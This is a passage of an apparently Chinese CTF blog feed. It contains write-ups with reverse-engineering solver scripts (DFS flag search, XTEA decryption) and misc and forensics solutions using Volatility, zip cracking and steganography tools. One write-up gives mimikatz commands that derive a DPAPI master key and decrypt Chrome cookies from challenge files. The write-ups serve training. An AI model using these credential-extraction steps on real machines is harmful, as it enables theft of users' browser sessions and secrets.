0x00F119F8, 0x00000004, 0x00F09E08, 0x0000003C, 0x00F12B30, 0x00000077, 0x00F0AC38, 0x00000023, 0x00F0A2F0, 0x00000000, 0x00F100D8, 0x00000062, 0x00F0E650, 0x00000020, 0x00F0F220, 0x00000044, 0x00F0CA60, 0x00000043, 0x00F0AB58, 0x00000058, 0x00F096E8, 0x00000013, 0x00F0CBB0, 0x00000056, 0x00F0C758, 0x00000032, 0x00F11288, 0x00000031, 0x00F0EC20, 0x00000072, 0x00F0A600, 0x00000046, 0x00F0B558, 0x00000023, 0x00F0EA80, 0x00000057, 0x00F0DF88, 0x00000038, 0x00F104B0, 0x0000003A, 0x00F10828, 0x00000049, 0x00F0EB00, 0x00000043, 0x00F09A78, 0x00000065, 0x00F0DC58, 0x00000018, 0x00F0E048, 0x00000043, 0x00F12768, 0x00000040, 0x00F0D8F8, 0x00000069, 0x00F0AFA0, 0x00000024, 0x00F0AA08, 0x00000038, 0x00F0DCF0, 0x00000069, 0x00F11BF0, 0x0000000B, 0x00F104D8, 0x00000042, 0x00F107E0, 0x0000002E, 0x00F0CAB8, 0x00000032, 0x00F0DD28, 0x00000013, 0x00F0B120, 0x00000053, 0x00F11798, 0x00000067, 0x00F0F2C0, 0x0000001D, 0x00F0FD80, 0x00000073, 0x00F0A498, 0x0000003E, 0x00F0AC38, 0x00000073, 0x00F0AFA0, 0x00000009, 0x00F0C078, 0x00000033, 0x00F0A020, 0x00000006, 0x00F0C8C8, 0x00000054, 0x00F0FD98, 0x00000021, 0x00F10BC0, 0x00000054, 0x00F11888, 0x00000014, 0x00F0D348, 0x00000048, 0x00F104C0, 0x00000074, 0x00F0E458, 0x00000078, 0x00F0DBC0, 0x00000019, 0x00F0E0C0, 0x00000034, 0x00F0FAD8, 0x00000023, 0x00F111E0, 0x0000001A, 0x00F10818, 0x00000003, 0x00F0D830, 0x00000029, 0x00F11840, 0x0000002A, 0x00F0CAA8, 0x0000005E, 0x00F0D930, 0x00000030, 0x00F11B60, 0x00000014, 0x00F11270, 0x0000005D, 0x00F0A648, 0x00000013, 0x00F11060, 0x0000001E, 0x00F0A2D8, 0x00000079, 0x00F0D188, 0x00000070, 0x00F0E610, 0x0000004B, 0x00F0D250, 0x00000054, 0x00F0CF18, 0x00000072, 0x00F0F8C8, 0x00000030, 0x00F0ECE0, 0x0000000E, 0x00F10BD0, 0x00000063, 0x00F0FF68, 0x00000024, 0x00F0E488, 0x0000004D, 0x00F0A200, 0x00000038, 0x00F0E210, 0x0000000B, 0x00F0E150, 0x0000006E, 0x00F10148, 0x0000004D, 0x00F11E10, 0x00000074, 0x00F10318, 0x0000006C, 0x00F0C188, 0x00000037, 0x00F0C620, 0x0000001E, 0x00F0F358, 0x0000004F, 0x00F0AC10, 0x0000007D, 0x00F0EC68, 0x0000004F, 0x00F0D350, 0x00000049, 0x00F11A38, 0x00000071, 0x00F09FD0, 0x00000000, 0x00F0C2A8, 0x00000008, 0x00F0D5B8, 0x00000040, 0x00F0BE00, 0x00000000, 0x00F0C5C0, 0x0000001E, 0x00F0EE90, 0x00000042, 0x00F11910, 0x0000004B, 0x00F0B850, 0x0000000D, 0x00F0EEF0, 0x00000035, 0x00F118A0, 0x00000052, 0x00F12300, 0x00000023, 0x00F0F768, 0x00000033, 0x00F10408, 0x00000036, 0x00F0F168, 0x0000005F, 0x00F0A570, 0x0000001B, 0x00F0FC70, 0x0000004D, 0x00F0B290, 0x0000001D, 0x00F0EFE8, 0x0000005F, 0x00F10210, 0x00000075, 0x00F0B2B0, 0x00000055, 0x00F0BC80, 0x0000001D, 0x00F11928, 0x00000057, 0x00F11F58, 0x00000053, 0x00F0F850]</span><br><span class=\"line\">base = 0xF09078</span><br><span class=\"line\">def dfs(array, node, path, depth):</span><br><span class=\"line\">    if depth == 48:</span><br><span class=\"line\">        print(path)</span><br><span class=\"line\">        result.append(path)</span><br><span class=\"line\">        return</span><br><span class=\"line\">    if depth &gt; 48:</span><br><span class=\"line\">        return</span><br><span class=\"line\">    for i in string.ascii_letters+string.digits+&quot;_!~@&quot;:</span><br><span class=\"line\">        i = ord(i)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            if i == (array[2*(i+node)]+5) or i == (array[2*(i+node)]-5):</span><br><span class=\"line\">                neighbor = (array[2*(i+node)+1] - base) // 8</span><br><span class=\"line\">                dfs(array, neighbor, path + chr(i), depth + 1)</span><br><span class=\"line\">        except IndexError:</span><br><span class=\"line\">            return</span><br><span class=\"line\">result = []</span><br><span class=\"line\">dfs(data, 0, &quot;&quot;, 0)</span><br><span class=\"line\"># Somet1mes_ch0ice_i5_more_import@nt_tHan_effort~!</span><br></pre></td></tr></table></figure>\n<h4 id=\"babycpp\"><a class=\"markdownIt-Anchor\" href=\"#babycpp\">#</a> Babycpp</h4>\n<p>数据输入后，经过魔改 Tea 加密和 RC4 加密后，与 cipher 进行对比</p>\n<p>Tea 加密由 (std::for_each&lt;unsigned long *,main::{lambda (unsigned long<br>\n&amp;)#1}&gt;)(v21, v16_str, v16_str + 4i64 * v15_0c, v10); 进入</p>\n<p>void **fastcall main::{lambda(unsigned long &amp;)#1}::operator()(**int64<br>\n**a1, __int64<br>\na2) 进行密钥的赋值，接着进行在 text_79 中进行 delate 赋值并进行加密</p>\n<p>**int64 **fastcall a43ff4190df3b6eee1d76b074c6c98d7::unknown9(unsigned<br>\nlong *)::{lambda (void)#1}::operator () 最终的加密在该函数中进行</p>\n<p>加密后 b63a8f7f7e4797a753840481428f0f18::unknown11 (v12, v11); 进行 rc4 加密</p>\n<p>**int64 **fastcall<br>\nb63a8f7f7e4797a753840481428f0f18::unknown11(std::vector <code>&lt;unsigned char&gt;</code> <br>\n&amp;)::{lambda (unsigned char &amp;)#1}::operator () 进行主要的加密操作</p>\n<p>此部分直接动调 S_boxss</p>\n<p>最终脚本如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def xtea_decrypt(rounds, block, key):</span><br><span class=\"line\"></span><br><span class=\"line\">  v0, v1 = block</span><br><span class=\"line\"></span><br><span class=\"line\">  delta = 0xDEADBEEF</span><br><span class=\"line\"></span><br><span class=\"line\">  total = delta * rounds</span><br><span class=\"line\"></span><br><span class=\"line\">  for _ in range(rounds):</span><br><span class=\"line\"></span><br><span class=\"line\">    v1 = (v1 - (((v0 &lt;&lt; 4 ^ v0 &gt;&gt; 5) + v0) ^ (total + key[(total&gt;&gt;11) &amp; 3]))) &amp; 0xFFFFFFFF</span><br><span class=\"line\"></span><br><span class=\"line\">    total = (total - delta) &amp; 0xFFFFFFFF</span><br><span class=\"line\"></span><br><span class=\"line\">    v0 = (v0 - (((v1 &lt;&lt; 4 ^ v1 &gt;&gt; 5) + v1) ^ (total + key[total &amp; 3]))) &amp; 0xFFFFFFFF</span><br><span class=\"line\"></span><br><span class=\"line\">  return v0, v1</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">def adjust_value(val):</span><br><span class=\"line\"></span><br><span class=\"line\">  return val if val &gt;= 0 else 256 + val</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">def merge_data(data):</span><br><span class=\"line\"></span><br><span class=\"line\">  return data[0] | (data[1] &lt;&lt; 8) | (data[2] &lt;&lt; 16) | (data[3] &lt;&lt; 24)</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">def process_data(cipher, Xor, add, st):</span><br><span class=\"line\"></span><br><span class=\"line\">  modified_data = [(adjust_value(cipher[i] ^ Xor[i]) - add[i]) ^ st[i] for i in range(50)]</span><br><span class=\"line\"></span><br><span class=\"line\">  return [merge_data(modified_data[i*4:(i+1)*4]) for i in range(12)]</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">def perform_decryption():</span><br><span class=\"line\"></span><br><span class=\"line\">  key = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476]</span><br><span class=\"line\"></span><br><span class=\"line\">  num_rounds = 0x100</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">  cipher = [0x33, 0xB2, 0x49, 0x8C, 0x39, 0xDD, 0x60, 0x5F, 0x5F, 0x77, 0x72, 0xAB, 0x38, 0xD9, 0xED, 0xE7, 0xF3, 0xF0, 0x66, 0x67, 0x16, 0xC8, 0x53, 0x80, 0x71, 0xB2, 0xFA, 0x5E, 0x7C, 0x2B, 0xBB, 0x0B, 0xE5, 0x88, 0x82, 0x0B, 0x06, 0x8C, 0x8D, 0xAD, 0x47, 0xB5, 0x85, 0xBB, 0x06, 0x8D, 0x01, 0x2B] </span><br><span class=\"line\"></span><br><span class=\"line\">  Xor = [0xee, 0x17, 0x80, 0xe3, 0x17, 0xa, 0xe5, 0x53, 0x33, 0x9e, 0x2e, 0x1d, 0x5, 0x6f, 0xb4, 0x51, 0x9a, 0x36, 0x5c, 0xbd, 0x8, 0xa2, 0x34, 0xa3, 0x65, 0x59, 0x62, 0xae, 0x34, 0xd, 0xd0, 0xbc, 0x30, 0x81, 0xeb, 0x8c, 0x65, 0x36, 0xfd, 0x7e, 0x4a, 0x1e, 0x10, 0x27, 0xdd, 0x5a, 0xa4, 0xb]    </span><br><span class=\"line\"></span><br><span class=\"line\">  add = [0x56, 0x2d, 0xf8, 0x42, 0x7f, 0xc2, 0x26, 0x63, 0x83, 0x32, 0xc4, 0x3f, 0xb9, 0xa8, 0x7f, 0xc9, 0x43, 0x22, 0xc6, 0x89, 0x6b, 0x5d, 0xef, 0x2e, 0xe8, 0x20, 0xcd, 0xbf, 0x84, 0xf0, 0x7b, 0x4d, 0xd2, 0x3f, 0x4f, 0xb7, 0x95, 0xf0, 0xcd, 0x96, 0x57, 0x56, 0x43, 0xf1, 0x6b, 0x1, 0xc6, 0x36] </span><br><span class=\"line\"></span><br><span class=\"line\">  st = [0x3b, 0x3b, 0x3e, 0xe8, 0x2c, 0x72, 0x2e, 0xc7, 0xc7, 0xde, 0x12, 0xd1, 0x91, 0x34, 0x61, 0x59, 0x1d, 0x13, 0x81, 0xd4, 0x87, 0x67, 0xeb, 0x73, 0x7c, 0x58, 0xa4, 0x6a, 0x98, 0x97, 0x1f, 0x83, 0x2d, 0xa3, 0x90, 0x76, 0xdb, 0xf0, 0x18, 0x89, 0x8d, 0xe2, 0xa7, 0x2e, 0x44, 0xbc, 0x4c, 0x6c]  </span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">  final_data = process_data(cipher, Xor, add, st)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">  for i in range(0, 12, 2):</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypted_block = xtea_decrypt(num_rounds, final_data[i:i+2], key)</span><br><span class=\"line\"></span><br><span class=\"line\">    print(f&quot;Decrypted Block &#123;i//2&#125;: &#123;decrypted_block&#125;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">perform_decryption()</span><br></pre></td></tr></table></figure>\n<h3 id=\"数据安全\"><a class=\"markdownIt-Anchor\" href=\"#数据安全\">#</a> 数据安全</h3>\n<h4 id=\"cyan-1\"><a class=\"markdownIt-Anchor\" href=\"#cyan-1\">#</a> Cyan-1</h4>\n<p>注册后做题就行了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1706620684161-7a964022-5591-410c-8080-c58a91dfc5f7.png\" alt=\"\"></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%8F%A4%E5%89%91%E5%B1%B1%20Misc/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%8F%A4%E5%89%91%E5%B1%B1%20Misc/",
            "title": "古剑山 Misc",
            "date_published": "2024-04-16T05:58:19.047Z",
            "content_html": "<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"i-have-the-flag\"><a class=\"markdownIt-Anchor\" href=\"#i-have-the-flag\">#</a> i have the flag</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208131607810.png\" alt=\"\"></p>\n<p>附件得到 js 文件和 html，分析 js 代码和前端代码的关系</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208131905062.png\" alt=\"\"></p>\n<p>html 中调用了 checkToken 函数</p>\n<p>js 代码中的 checkToken 是这么写的</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208132018245.png\" alt=\"\"></p>\n<p>但是直接进行校验明显不对</p>\n<p>发现 ic 是判断条件，需要跟踪寻找 ic</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208132209608.png\" alt=\"\"></p>\n<p>直接写脚本逆向即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">key1=[118, 108, 112, 115, 111, 104, 104, 103, 120, 52, 53, 54]</span><br><span class=\"line\">token=&quot;&quot;</span><br><span class=\"line\">for i in key1:</span><br><span class=\"line\">   token+=chr(i-3)</span><br><span class=\"line\">print(token)</span><br></pre></td></tr></table></figure>\n<p>得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">simpleedu123</span><br></pre></td></tr></table></figure>\n<p>放入前端进行校验</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208132607674.png\" alt=\"\"></p>\n<p><strong>flag{muWn9NU0H6erBN/w+C7HVg}</strong></p>\n<h3 id=\"幸运饼干\"><a class=\"markdownIt-Anchor\" href=\"#幸运饼干\">#</a> 幸运饼干</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208132729310.png\" alt=\"\"></p>\n<p>得到两个文件，发现 flag.zip 被加密，且其中也有同样的 hint.jpg，直接明文爆破</p>\n<p>将 hint.jpg 用 bandzip 进行压缩之后 ARCHPR 明文爆破</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208133048604.png\" alt=\"\"></p>\n<p>解压出四个文件</p>\n<p>在 admin.txt 中对 ntlm 进行解码得到 password：54231</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208133453442.png\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208133520532.png\" alt=\"\"></p>\n<p>接着根据 SID 压缩包中的 GUID 文件，利用 mimikatz 获取到 masterkey</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpapi::masterkey /in:&quot;master.key&quot; /sid:S-1-5-21-726299542-2485387390-1117163988-1001 /password:54231</span><br></pre></td></tr></table></figure>\n<p>这里的 master.key 文件就是 SID 压缩包中的文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208133724082.png\" alt=\"\"></p>\n<p>得到 key</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7a4d2ffbb42d0a1ab46f0351260aef16cae699e03e9d6514b3bf10e2977c5d228fda4a48e39b7b8a06a443c39653c2a3c3656596e7edc84e1c9682511c8343ac</span><br></pre></td></tr></table></figure>\n<p>再利用 key 对 Cookies 进行 chrome 解密得到 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpapi::chrome /in:Cookies /masterkey: 7a4d2ffbb42d0a1ab46f0351260aef16cae699e03e9d6514b3bf10e2977c5d228fda4a48e39b7b8a06a443c39653c2a3c3656596e7edc84e1c9682511c8343ac /file:Cookies</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208133830546.png\" alt=\"\"></p>\n<p><strong>flag{mimikatz_is_bravo_xzjc72}</strong></p>\n<h3 id=\"数独\"><a class=\"markdownIt-Anchor\" href=\"#数独\">#</a> 数独</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208134732690.png\" alt=\"\"></p>\n<p>附件得到两张图片</p>\n<p>不知道算不算非预期，gaps 算好 size 一把梭就好了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gaps --image=image.png --generations=40 --population=120 --size=70</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208134842612.png\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208134921583.png\" alt=\"\"></p>\n<p>按顺序拼接得到 flag</p>\n<p><strong>flag{4e4d6c332b6fe62a63afe56171fd3725}</strong></p>\n<h3 id=\"jpginside\"><a class=\"markdownIt-Anchor\" href=\"#jpginside\">#</a> jpginside</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231210104436420.png\" alt=\"\"></p>\n<p>查看文件头发现是 pyc 文件，修改后缀进行反编译</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">store = [] #数据太长已省略</span><br><span class=\"line\">key = raw_input(&#x27;Please input the key:&#x27;)</span><br><span class=\"line\">with open(&#x27;excellent.jpg&#x27;, &#x27;wb&#x27;) as jpg:</span><br><span class=\"line\">    for i in range(len(store)):</span><br><span class=\"line\">        jpg.write(chr(store[i] ^ ord(key[i % len(key)])))</span><br></pre></td></tr></table></figure>\n<p>key[i %<br>\n len (key)] 在前几位还是 key [i] 本身，可以根据异或反推出 key：rotate1234!</p>\n<p>再根据 key 推回完整的 jpg 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">store = [] #数据已省略</span><br><span class=\"line\">key = &#x27;rotate1234!&#x27;</span><br><span class=\"line\">with open(&#x27;out.jpg&#x27;, &#x27;wb&#x27;) as jpg:</span><br><span class=\"line\">    for i in range(len(store)):</span><br><span class=\"line\">        jpg.write(bytes([store[i] ^ ord(key[i % len(key)])]))</span><br></pre></td></tr></table></figure>\n<p>发现文件末尾有 zip 文件，其中头部两字节被修改</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231210112208349.png\" alt=\"\"></p>\n<p>改回 504b 手撕出来</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231210112320787.png\" alt=\"\"></p>\n<p>得到加密 txt，密码就是 key，得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jpek&#123;39i0jf49229fie5j33f02403hj953012&#125;</span><br></pre></td></tr></table></figure>\n<p>凯撒枚举偏移得到 flag</p>\n<p><strong>flag{39e0fb49229bea5f33b02403df953012}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%AE%89%E6%B4%B5%E6%9D%AF2023%20Misc/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%AE%89%E6%B4%B5%E6%9D%AF2023%20Misc/",
            "title": "安洵杯2023 Misc",
            "date_published": "2024-04-16T05:58:19.041Z",
            "content_html": "<h1 id=\"安洵杯2023-misc\"><a class=\"markdownIt-Anchor\" href=\"#安洵杯2023-misc\">#</a> 安洵杯 2023 Misc</h1>\n<h2 id=\"dacongのwindows\"><a class=\"markdownIt-Anchor\" href=\"#dacongのwindows\">#</a> <strong>dacong の Windows</strong></h2>\n<p>题目描述是：好像什么重要的表被修改了，猜测是注册表文件被修改</p>\n<p>刚开始利用 vol2 进行查看 imageinfo 的信息，发现镜像文件为 win10，于是就改用了 vol3，避免出现一些问题</p>\n<h3 id=\"flag3\"><a class=\"markdownIt-Anchor\" href=\"#flag3\">#</a> flag3：</h3>\n<p>首先按照老套路扫描一下文件，直接 grep 出关键字符串 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./vol.py -f dacong.raw windows.filescan | grep flag</span><br></pre></td></tr></table></figure>\n<p>发现了桌面上的 flag3.txt 文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225181103520.png\" alt=\"\"></p>\n<p>dump 下来进行查看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./vol.py -f ../../dacong.raw windows.dumpfiles --virtaddr=&quot;0xe0007a09d470&quot;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225181219320.png\" alt=\"\"></p>\n<p>得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">U2FsdGVkX18M+E34cKJlmTU3uo1lHqjUQhKPTBGJiMjg4RWX6saTjOJmLU86538e</span><br></pre></td></tr></table></figure>\n<p>发现还套了一层加密，看上去像是 aes，需要寻找 key，而这里的 key 就在题目所提示的注册表当中</p>\n<p>用命令列出注册表的所有键值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./vol.py -f ../../dacong.raw windows.registry.printkey</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225182915579.png\" alt=\"\"></p>\n<p>能发现一个类似 key 的字符串，拿去解密一下试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225183338699.png\" alt=\"\"></p>\n<p>直接用 puzzle 爆破出来了 flag3：dAc0Ng_SIst3Rs???}</p>\n<h3 id=\"flag2\"><a class=\"markdownIt-Anchor\" href=\"#flag2\">#</a> flag2：</h3>\n<p>利用取证大师对文件进行深度恢复之后再次进行自动取证</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225185122528.png\" alt=\"\"></p>\n<p>发现回收站删除的文件中有个 secret.rar 文件，进行导出并解压</p>\n<p>全选之后根据文本内容提示猜测为 snow 隐写</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225185243753.png\" alt=\"\"></p>\n<p>无密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\SNOW.EXE -C flag2.txt</span><br></pre></td></tr></table></figure>\n<p>得到 flag2:_tHE_Dddd</p>\n<h3 id=\"flag1\"><a class=\"markdownIt-Anchor\" href=\"#flag1\">#</a> flag1：</h3>\n<p>利用 R-studio 扫描文件，在 miku 的桌面上发现了很多的 dacong.wav</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225191203991.png\" alt=\"\"></p>\n<p>直接恢复出来发现音频都有些问题，包括之前的 secret.rar 文件用 R-studio 恢复出来也是损坏的，这里可以使用 vol3 进行 dump</p>\n<p>一个个听一下发现 dacong39.wav 是 sstv，用 rxsstv 进行识别得到 flag1</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225200952125.png\" alt=\"\"></p>\n<p>flag1：flag{Ar3_Th3Y</p>\n<p>拼接得到完整 flag</p>\n<p><strong>flag{Ar3_Th3Y_tHE_DddddAc0Ng_SIst3Rs???}</strong></p>\n<h2 id=\"疯狂的麦克斯\"><a class=\"markdownIt-Anchor\" href=\"#疯狂的麦克斯\">#</a> 疯狂的麦克斯</h2>\n<p>拿到三个文件，首先看到了 FLAG.zip，根据题目描述应该是最后的 flag 文件，先看看无后缀的麦克斯的称号</p>\n<p>记事本打开发现存在一些不可见的字符</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225202958815.png\" alt=\"\"></p>\n<p>猜测零宽，解密得到称号 mks007</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225203137452.png\" alt=\"\"></p>\n<p>接着嗨.zip 文件解压出来 word 文件，修改后缀为 zip 之后发现了 MKS<br>\nIM 麦克斯.txt 文件</p>\n<p>打开发现是字符表，文本末尾还有一串字符串</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225203750741.png\" alt=\"\"></p>\n<p>经过尝试得知是凯撒移位</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231225204056165.png\" alt=\"\"></p>\n<p>根据后来修改的题目描述可以知道压缩包密码是某个值的 base64，文本末尾算是个凯撒的提示吧，把整个字符表进行凯撒位移</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231226135340902.png\" alt=\"\"></p>\n<p>利用脚本将列表中的每个值进行 base64 加密并对压缩包进行爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span 